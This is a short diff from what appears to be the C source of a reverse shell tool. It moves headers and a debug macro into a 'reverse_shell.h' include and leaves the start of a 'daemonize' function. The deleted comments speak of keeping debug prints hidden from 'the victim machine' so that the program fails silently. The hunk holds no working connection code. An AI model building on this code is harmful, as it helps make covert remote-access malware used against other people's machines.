@@ -1,37 +1,4 @@
-#include <stdio.h>
-#include <arpa/inet.h>
-#include <netinet/in.h>
-#include <stdbool.h>
-#include <netdb.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdlib.h>
-
-
-// uncomment the line below to allow for debug prints,however remember to comment them for live testing
-// you don't really want the victim machine to see your debug prints,fail silently
-
-// #define DEBUG 1
-
-#ifdef DEBUG
-
-#define PRINT_DEBUG(msg) perror(msg)
-
-#else
-
-#define PRINT_DEBUG(msg) printf(" ")
-
-
-#endif
-
-
-#define return_defer(label) goto label
-
-// use the exposed global environment variables
-extern char **environ;
-
+#include "include/reverse_shell.h"
 
 bool daemonize(const char *dir_path)
 {
